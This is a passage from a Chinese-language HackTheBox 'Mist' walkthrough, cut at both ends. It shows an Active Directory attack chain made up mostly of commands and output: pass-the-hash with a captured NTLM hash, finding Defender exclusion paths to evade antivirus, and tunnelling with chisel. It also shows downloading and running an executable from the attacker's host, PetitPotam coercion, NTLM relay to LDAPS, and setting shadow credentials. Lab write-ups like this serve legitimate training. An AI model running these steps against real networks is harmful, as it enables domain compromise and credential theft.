Admin</span><br><span class="line">SMB         192.168.100.100 445    DC01             C$                              Default share</span><br><span class="line">SMB         192.168.100.100 445    DC01             IPC$            READ            Remote IPC</span><br><span class="line">SMB         192.168.100.100 445    DC01             NETLOGON        READ            Logon server share</span><br><span class="line">SMB         192.168.100.100 445    DC01             SYSVOL          READ            Logon server share</span><br></pre></td></tr></table></figure>

<p>就共享访问而言。DC的主机名为DC01。我将这两个ip添加到我的&#x2F;etc&#x2F;hosts文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">192.168.100.100 DC01</span><br><span class="line">192.168.100.101 MS01</span><br></pre></td></tr></table></figure>

<h3 id="Creating-Machines"><a href="#Creating-Machines" class="headerlink" title="Creating Machines"></a>Creating Machines</h3><p>一种常见的滥用技术是在域中创建假机器，默认情况下，任何域用户最多可以创建10个假机器。通常我会使用如下方式查询：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-AdObject -Identity ((Get-AdDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota</span><br></pre></td></tr></table></figure>

<p>不幸的是，这没有返回任何结果，因为这个主机上没有安装PowerShell AD模块。不过，我可以用LDAP查询做到这一点：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Windows\system32&gt; <span class="variable">$domain</span> = ([ADSI]<span class="string">&quot;LDAP://RootDSE&quot;</span>).defaultNamingContext</span><br><span class="line">PS C:\Windows\system32&gt; <span class="variable">$searcher</span> = New-Object DirectoryServices.DirectorySearcher</span><br><span class="line">PS C:\Windows\system32&gt; <span class="variable">$searcher</span>.SearchRoot = <span class="string">&quot;LDAP://<span class="variable">$domain</span>&quot;</span></span><br><span class="line">PS C:\Windows\system32&gt; <span class="variable">$searcher</span>.Filter = <span class="string">&quot;(objectClass=domainDNS)&quot;</span></span><br><span class="line">PS C:\Windows\system32&gt; <span class="variable">$searcher</span>.PropertiesToLoad.Add(<span class="string">&quot;ms-ds-machineaccountquota&quot;</span>) | Out-Null</span><br><span class="line">PS C:\Windows\system32&gt; <span class="variable">$result</span> = <span class="variable">$searcher</span>.FindOne()</span><br><span class="line">PS C:\Windows\system32&gt; <span class="variable">$result</span></span><br><span class="line"></span><br><span class="line">Path                  Properties</span><br><span class="line">----                  ----------</span><br><span class="line">LDAP://DC=mist,DC=htb &#123;ms-ds-machineaccountquota, adspath&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PS C:\Windows\system32&gt; <span class="variable">$quota</span> = <span class="variable">$result</span>.Properties[<span class="string">&quot;ms-ds-machineaccountquota&quot;</span>][0]</span><br><span class="line">PS C:\Windows\system32&gt; <span class="variable">$quota</span></span><br><span class="line">0</span><br></pre></td></tr></table></figure>

<p>这里的结果是0，意味着我不能添加一台计算机。</p>
<p>也可以用netexec和上面收集的hash来检查这一点：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/mist</span><br><span class="line">&gt; proxychains -q netexec ldap 192.168.100.100 -u brandon.keywarp -H DB03D6A77A2205BC1D07082740626CC9 -M maq</span><br><span class="line">[-] Failed loading module at /usr/lib/python3/dist-packages/nxc/modules/mremoteng.py: No module named <span class="string">&#x27;lxml&#x27;</span></span><br><span class="line">/usr/lib/python3/dist-packages/pypykatz/_version.py:11: SyntaxWarning: invalid escape sequence <span class="string">&#x27;\.&#x27;</span></span><br><span class="line">  <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">[-] Failed loading module at /usr/lib/python3/dist-packages/nxc/modules/wifi.py: No module named &#x27;lxml&#x27;</span></span><br><span class="line"><span class="string">SMB         192.168.100.100 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:mist.htb) (signing:True) (SMBv1:False)</span></span><br><span class="line"><span class="string">LDAP        192.168.100.100 389    DC01             [+] mist.htb\brandon.keywarp:DB03D6A77A2205BC1D07082740626CC9</span></span><br><span class="line"><span class="string">MAQ         192.168.100.100 389    DC01             [*] Getting the MachineAccountQuota</span></span><br><span class="line"><span class="string">MAQ         192.168.100.100 389    DC01             MachineAccountQuota: 0</span></span><br></pre></td></tr></table></figure>

<h3 id="AV-x2F-AMSI-Evasion"><a href="#AV-x2F-AMSI-Evasion" class="headerlink" title="AV &#x2F; AMSI Evasion"></a>AV &#x2F; AMSI Evasion</h3><p>注意到AMSI阻止了我的PowerShell执行。Defender在运行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; tasklist</span><br><span class="line">...[snip]...</span><br><span class="line">MsMpEng.exe                    848                            0    203,912 K</span><br><span class="line">...[snip]...</span><br><span class="line">NisSrv.exe                    3856                            0      5,424 K</span><br><span class="line">...[snip]...</span><br></pre></td></tr></table></figure>

<p>允许从AV中列出web文件夹并不罕见，这里就是这种情况。如果我将webshell复制到C:\programdata，它会复制，但在试图访问它时，Defender会启动并删除它：</p>
<p>所以我会在\xampp\htdocs\中做任何需要避免AV的事情。files目录是一个很好的地方，因为它不受清理命令的约束。</p>
<p>最初解决Mist之后，我发现了这篇文章<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmZuZHNlYy5uZXQvMjAyNC8xMC8wNC91bmNvdmVyaW5nLWV4Y2x1c2lvbi1wYXRocy1pbi1taWNyb3NvZnQtZGVmZW5kZXItYS1zZWN1cml0eS1yZXNlYXJjaC1pbnNpZ2h0Lw==">Peeking Behind the Curtain: Finding Defender’s Exclusions<i class="fa fa-external-link-alt"></i></span>，其中展示了作为普通用户枚举排除路径的方法。他们提到了一个使用事件日志的方法，它在PowerShell中有效：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Windows\system32&gt; Get-WinEvent -LogName <span class="string">&quot;Microsoft-Windows-Windows Defender/Operational&quot;</span> -FilterXPath <span class="string">&quot;*[System[(EventID=5007)]]&quot;</span> | Where-Object &#123; <span class="variable">$_</span>.Message -like <span class="string">&quot;*Exclusions\Paths*&quot;</span> &#125; | Select-Object -Property TimeCreated, Id, Message | Format-List</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">TimeCreated : 2/25/2024 5:36:45 AM</span><br><span class="line">Id          : 5007</span><br><span class="line">Message     : Microsoft Defender Antivirus Configuration has changed. If this is an unexpected event you should review</span><br><span class="line">              the settings as this may be the result of malware.</span><br><span class="line">                Old value:</span><br><span class="line">                New value: HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\xampp\htdocs = 0x0</span><br></pre></td></tr></table></figure>

<p>MpCmdRun.exe方法确认：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Windows\system32&gt; &amp; <span class="string">&quot;C:\Program Files\Windows Defender\MpCmdRun.exe&quot;</span> -Scan -ScanType 3 -File <span class="string">&quot;C:\xampp\htdocs\|*&quot;</span></span><br><span class="line">Scan starting...</span><br><span class="line">Scan finished.</span><br><span class="line">Scanning C:\xampp\htdocs\|* was skipped.</span><br></pre></td></tr></table></figure>

<p>该目录被跳过了</p>
<h3 id="LDAP-Signing"><a href="#LDAP-Signing" class="headerlink" title="LDAP Signing"></a>LDAP Signing</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/mist</span><br><span class="line">&gt; proxychains -q netexec ldap 192.168.100.100 -u brandon.keywarp -H DB03D6A77A2205BC1D07082740626CC9 -M ldap-checker</span><br><span class="line">[-] Failed loading module at /usr/lib/python3/dist-packages/nxc/modules/mremoteng.py: No module named <span class="string">&#x27;lxml&#x27;</span></span><br><span class="line">[-] Failed loading module at /usr/lib/python3/dist-packages/nxc/modules/wifi.py: No module named <span class="string">&#x27;lxml&#x27;</span></span><br><span class="line">SMB         192.168.100.100 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:mist.htb) (signing:True) (SMBv1:False)</span><br><span class="line">LDAP        192.168.100.100 389    DC01             [+] mist.htb\brandon.keywarp:DB03D6A77A2205BC1D07082740626CC9</span><br><span class="line">LDAP-CHE... 192.168.100.100 389    DC01             LDAP Signing NOT Enforced!</span><br><span class="line">LDAP-CHE... 192.168.100.100 389    DC01             LDAPS Channel Binding is <span class="built_in">set</span> to <span class="string">&quot;NEVER&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="PetitPotam-Attack"><a href="#PetitPotam-Attack" class="headerlink" title="PetitPotam Attack"></a>PetitPotam Attack</h2><h3 id="策略"><a href="#策略" class="headerlink" title="策略"></a>策略</h3><p>由于没有启用LDAP签名，将使用PetitPotam工具强制Windows以MS01$机器帐户的身份验证回给我。这里有两个问题：</p>
<ol>
<li>PetitPotam中使用的web客户端服务没有启动，所以我需要启动它。</li>
<li>这种攻击需要一个DNS名称来表示机器帐户要进行身份验证的位置。不幸的是，没有我可以访问的帐户可以在域上创建DNS记录（这是一个非默认配置，但并非不切实际的配置）。使用隧道来瞄准MS01，并让它返回到我的主机。</li>
</ol>
<p>一旦克服了这些问题，就可以让MS01$向我的主机进行身份验证了。使用Responder捕获此验证NetNTLMv2 hash，但由于机器帐户通常具有非常强的随机密码，因此这不会提供太多价值。可以将此攻击转发给DC以获得MS01$的访问权限并对该帐户进行更改。通常情况下，会在这里使用RBCD攻击，像在<span class="exturl" data-url="aHR0cHM6Ly8weGRmLmdpdGxhYi5pby8yMDIyLzEyLzE3L2h0Yi1zdXBwb3J0Lmh0bWwjc2hlbGwtYXMtZG9tYWluYWRtaW4=">support<i class="fa fa-external-link-alt"></i></span>中一样使用假计算机，正如上面所示，无法将计算机添加到域中。相反，将使用ntlmrelayx（来自<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1NlY3VyZUF1dGhDb3JwL2ltcGFja2V0">Impacket<i class="fa fa-external-link-alt"></i></span>）中的LDAP shell向机器帐户添加shadow credential，从而允许完全破坏MS01。</p>
<h3 id="Enable-webclient"><a href="#Enable-webclient" class="headerlink" title="Enable webclient"></a>Enable webclient</h3><p>可以使用c#与<span class="exturl" data-url="aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20va2xlelZpcnVzL2FmMDA0ODQyYTczNzc5ZTFkMDNkNDdlMDQxMTE1Nzk3">EtwStartWebClient.cs<i class="fa fa-external-link-alt"></i></span>启动服务。保存该文件并使用mono编译它(apt install mono-mcs)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/mist</span><br><span class="line">&gt; mcs EtwStartWebClient.cs /unsafe</span><br><span class="line">root@kali:~/hackthebox/machine/mist</span><br><span class="line">&gt; file EtwStartWebClient.exe</span><br><span class="line">EtwStartWebClient.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, <span class="keyword">for</span> MS Windows, 3 sections</span><br><span class="line"></span><br><span class="line">PS C:\xampp\htdocs\files&gt; Invoke-WebRequest -Uri http://10.10.14.22/EtwStartWebClient.exe -OutFile EtwStartWebClient.exe</span><br><span class="line">PS C:\xampp\htdocs\files&gt; .\EtwStartWebClient.exe</span><br><span class="line">[+] WebClient Service started successfully</span><br></pre></td></tr></table></figure>

<p>有一个清理作业可以非常快速地恢复此操作，因此需要在需要时再次运行它。</p>
<h3 id="Tunnel"><a href="#Tunnel" class="headerlink" title="Tunnel"></a>Tunnel</h3><p>目前仅限于DC01和MS01。在MS01上启动一条隧道（选择一个任意高端口9001），并将其转发到我的主机上的post 80：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\chisel.exe client 10.10.14.22:8000 22301:127.0.0.1:80</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Mist2.png"></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Common Applications&gt; curl 127.0.0.1:22301</span><br><span class="line">PS C:\Common Applications&gt; curl 127.0.0.1:22301</span><br><span class="line"></span><br><span class="line">127.0.0.1 - - [27/Oct/2024 14:14:00] <span class="string">&quot;GET / HTTP/1.1&quot;</span> 200 -</span><br><span class="line">127.0.0.1 - - [27/Oct/2024 14:14:07] <span class="string">&quot;GET / HTTP/1.1&quot;</span> 200 -</span><br></pre></td></tr></table></figure>

<h3 id="Attack-Without-Relay"><a href="#Attack-Without-Relay" class="headerlink" title="Attack Without Relay"></a>Attack Without Relay</h3><p>使用这个<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RvcG90YW0vUGV0aXRQb3RhbQ==">PetitPotam POC<i class="fa fa-external-link-alt"></i></span>与exe和Python脚本。考虑到隧道，将使用Python脚本。以root身份运行，以避免奇怪的Python path&#x2F;sudo交互，为brandon.keywarp赋予权限，和MS01@22301&#x2F;whatever的目标作为主机，端口，和一个字符串，这里不重要：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/mist</span><br><span class="line">&gt; proxychains python /root/PetitPotam/PetitPotam.py -u brandon.keywarp -hashes :DB03D6A77A2205BC1D07082740626CC9 -d mist.htb <span class="string">&#x27;MS01@22301/whatever&#x27;</span> 192.168.100.101 -pipe all</span><br><span class="line">[proxychains] config file found: /etc/proxychains.conf</span><br><span class="line">[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line">/root/PetitPotam/PetitPotam.py:20: SyntaxWarning: invalid escape sequence <span class="string">&#x27;\ &#x27;</span></span><br><span class="line">  show_banner = <span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">              ___            _        _      _        ___            _</span></span><br><span class="line"><span class="string">             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __</span></span><br><span class="line"><span class="string">             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | &#x27;</span>  \</span><br><span class="line">            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_|</span><br><span class="line">          _| <span class="string">&quot;&quot;</span><span class="string">&quot; |_|&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span>|_|<span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;|_|&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span>|_|<span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;|_| &quot;</span><span class="string">&quot;&quot;</span> |_|<span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;|_|&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span>|_|<span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;|_|&quot;</span><span class="string">&quot;&quot;</span><span class="string">&quot;&quot;</span>|</span><br><span class="line">          <span class="string">&quot;`-0-0-&#x27;&quot;</span>`-0-0-<span class="string">&#x27;&quot;`-0-0-&#x27;</span><span class="string">&quot;`-0-0-&#x27;&quot;</span>`-0-0-<span class="string">&#x27;&quot;`-0-0-&#x27;</span><span class="string">&quot;`-0-0-&#x27;&quot;</span>`-0-0-<span class="string">&#x27;&quot;`-0-0-&#x27;</span><span class="string">&quot;`-0-0-&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">              PoC to elicit machine account authentication via some MS-EFSRPC functions</span></span><br><span class="line"><span class="string">                                      by topotam (@topotam77)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">                     Inspired by @tifkin_ &amp; @elad_shamir previous work on MS-RPRN</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Trying pipe efsr</span></span><br><span class="line"><span class="string">[-] Connecting to ncacn_np:192.168.100.101[\PIPE\efsrpc]</span></span><br><span class="line"><span class="string">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.101:445  ...  OK</span></span><br><span class="line"><span class="string">Something went wrong, check error status =&gt; SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.</span></span><br><span class="line"><span class="string">Trying pipe lsarpc</span></span><br><span class="line"><span class="string">[-] Connecting to ncacn_np:192.168.100.101[\PIPE\lsarpc]</span></span><br><span class="line"><span class="string">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.101:445  ...  OK</span></span><br><span class="line"><span class="string">[+] Connected!</span></span><br><span class="line"><span class="string">[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e</span></span><br><span class="line"><span class="string">[+] Successfully bound!</span></span><br><span class="line"><span class="string">[-] Sending EfsRpcOpenFileRaw!</span></span><br><span class="line"><span class="string">[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!</span></span><br><span class="line"><span class="string">[+] OK! Using unpatched function!</span></span><br><span class="line"><span class="string">[-] Sending EfsRpcEncryptFileSrv!</span></span><br><span class="line"><span class="string">[+] Got expected ERROR_BAD_NETPATH exception!!</span></span><br><span class="line"><span class="string">[+] Attack worked!</span></span><br><span class="line"><span class="string">Trying pipe samr</span></span><br><span class="line"><span class="string">[-] Connecting to ncacn_np:192.168.100.101[\PIPE\samr]</span></span><br><span class="line"><span class="string">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.101:445  ...  OK</span></span><br><span class="line"><span class="string">[+] Connected!</span></span><br><span class="line"><span class="string">[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e</span></span><br><span class="line"><span class="string">[+] Successfully bound!</span></span><br><span class="line"><span class="string">[-] Sending EfsRpcOpenFileRaw!</span></span><br><span class="line"><span class="string">[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!</span></span><br><span class="line"><span class="string">[+] OK! Using unpatched function!</span></span><br><span class="line"><span class="string">[-] Sending EfsRpcEncryptFileSrv!</span></span><br><span class="line"><span class="string">[+] Got expected ERROR_BAD_NETPATH exception!!</span></span><br><span class="line"><span class="string">[+] Attack worked!</span></span><br><span class="line"><span class="string">Trying pipe netlogon</span></span><br><span class="line"><span class="string">[-] Connecting to ncacn_np:192.168.100.101[\PIPE\netlogon]</span></span><br><span class="line"><span class="string">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.101:445  ...  OK</span></span><br><span class="line"><span class="string">[+] Connected!</span></span><br><span class="line"><span class="string">[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e</span></span><br><span class="line"><span class="string">[+] Successfully bound!</span></span><br><span class="line"><span class="string">[-] Sending EfsRpcOpenFileRaw!</span></span><br><span class="line"><span class="string">[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!</span></span><br><span class="line"><span class="string">[+] OK! Using unpatched function!</span></span><br><span class="line"><span class="string">[-] Sending EfsRpcEncryptFileSrv!</span></span><br><span class="line"><span class="string">[+] Got expected ERROR_BAD_NETPATH exception!!</span></span><br><span class="line"><span class="string">[+] Attack worked!</span></span><br><span class="line"><span class="string">Trying pipe lsass</span></span><br><span class="line"><span class="string">[-] Connecting to ncacn_np:192.168.100.101[\PIPE\lsass]</span></span><br><span class="line"><span class="string">[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.101:445  ...  OK</span></span><br><span class="line"><span class="string">[+] Connected!</span></span><br><span class="line"><span class="string">[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e</span></span><br><span class="line"><span class="string">[+] Successfully bound!</span></span><br><span class="line"><span class="string">[-] Sending EfsRpcOpenFileRaw!</span></span><br><span class="line"><span class="string">[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!</span></span><br><span class="line"><span class="string">[+] OK! Using unpatched function!</span></span><br><span class="line"><span class="string">[-] Sending EfsRpcEncryptFileSrv!</span></span><br><span class="line"><span class="string">[+] Got expected ERROR_BAD_NETPATH exception!!</span></span><br><span class="line"><span class="string">[+] Attack worked!</span></span><br></pre></td></tr></table></figure>

<h3 id="Relay"><a href="#Relay" class="headerlink" title="Relay"></a>Relay</h3><p>现在要把这个验证尝试发回给DC。将使用<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1R3MXNtL2ltcGFja2V0L3RyZWUvaW50ZXJhY3RpdmUtbGRhcC1zaGFkb3ctY3JlZHM=">Impacket的一个分支<i class="fa fa-external-link-alt"></i></span>，它目前是一个<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZvcnRyYS9pbXBhY2tldC9wdWxsLzE0MDI=">拉取请求<i class="fa fa-external-link-alt"></i></span>，原因我将在后面解释。运行ntlmrelayx开始收听：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/hackthebox/machine/mist</span><br><span class="line">&gt; proxychains -q ntlmrelayx.py -debug -t ldaps://192.168.100.100 -i -smb2support -domain mist.htb</span><br><span class="line">/usr/local/bin/ntlmrelayx.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  __import__(<span class="string">&#x27;pkg_resources&#x27;</span>).run_script(<span class="string">&#x27;impacket==0.10.1.dev1&#x27;</span>, <span class="string">&#x27;ntlmrelayx.py&#x27;</span>)</span><br><span class="line">Impacket v0.10.1.dev1 - Copyright 2022 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[+] Impacket Library Installation Path: /usr/local/lib/python3.12/dist-packages/impacket-0.10.1.dev1-py3.12.egg/impacket</span><br><span class="line">[*] Protocol Client DCSYNC loaded..</span><br><span class="line">[*] Protocol Client MSSQL loaded..</span><br><span class="line">[*] Protocol Client RPC loaded..</span><br><span class="line">[*] Protocol Client IMAP loaded..</span><br><span class="line">[*] Protocol Client IMAPS loaded..</span><br><span class="line">[*] Protocol Client LDAPS loaded..</span><br><span class="line">[*] Protocol Client LDAP loaded..</span><br><span class="line">[*] Protocol Client SMB loaded..</span><br><span class="line">[*] Protocol Client SMTP loaded..</span><br><span class="line">[*] Protocol Client HTTPS loaded..</span><br><span class="line">[*] Protocol Client HTTP loaded..</span><br><span class="line">[+] Protocol Attack SMB loaded..</span><br><span class="line">[+] Protocol Attack IMAP loaded..</span><br><span class="line">[+] Protocol Attack IMAPS loaded..</span><br><span class="line">[+] Protocol Attack DCSYNC loaded..</span><br><span class="line">[+] Protocol Attack HTTP loaded..</span><br><span class="line">[+] Protocol Attack HTTPS loaded..</span><br><span class="line">[+] Protocol Attack MSSQL loaded..</span><br><span class="line">[+] Protocol Attack LDAP loaded..</span><br><span class="line">[+] Protocol Attack LDAPS loaded..</span><br><span class="line">[+] Protocol Attack RPC loaded..</span><br><span class="line">[*] Running <span class="keyword">in</span> relay mode to single host</span><br><span class="line">[*] Setting up SMB Server</span><br><span class="line">[*] Setting up HTTP Server on port 80</span><br><span class="line">[*] Setting up WCF Server</span><br><span class="line"></span><br><span class="line">[*] Setting up RAW Server on port 6666</span><br><span class="line">[*] Servers started, waiting <span class="keyword">for</span> connections</span><br></pre></td></tr></table></figure>

<p>现在，启动web客户端，然后像以前一样运行PetitPotam。Ntlmrelayx看到：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PS C:\xampp\htdocs\files&gt; .\EtwStartWebClient.exe</span><br><span class="line">[+] WebClient Service started successfully</span><br><span class="line">root@kali:~/hackthebox/machine/mist</span><br><span class="line">&gt; proxychains python /root/PetitPotam/PetitPotam.py -u brandon.keywarp -hashes :DB03D6A77A2205BC1D07082740626CC9 -d mist.htb <span class="string">&#x27;MS01@22301/whatever&#x27;</span> 192.168.100.101 -pipe all</span><br><span class="line"></span><br><span class="line">[*] HTTPD(80): Connection from 127.0.0.1 controlled, attacking target ldaps://192.168.100.100</span><br><span class="line">[*] HTTPD(80): Authenticating against ldaps://192.168.100.100 as MIST/MS01$ SUCCEED</span><br><span class="line">[*] Started interactive Ldap shell via TCP on 127.0.0.1:11000</span><br><span class="line">[+] No more targets</span><br><span class="line">[*] HTTPD(80): Connection from 127.0.0.1 controlled, but there are no more targets left!</span><br></pre></td></tr></table></figure>

<p>连接shell</p>
<p>在上面提到的分叉中添加了两个选项：clear_shadow_creds和set_shadow_creds。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mist % nc 127.0.0.1 11000</span><br><span class="line">Type <span class="built_in">help</span> <span class="keyword">for</span> list of commands</span><br><span class="line"></span><br><span class="line"><span class="comment"># clear_shadow_creds MS01$</span></span><br><span class="line">Found Target DN: CN=MS01,CN=Computers,DC=mist,DC=htb</span><br><span class="line">Target SID: S-1-5-21-1045809509-3006658589-2426055941-1108</span><br><span 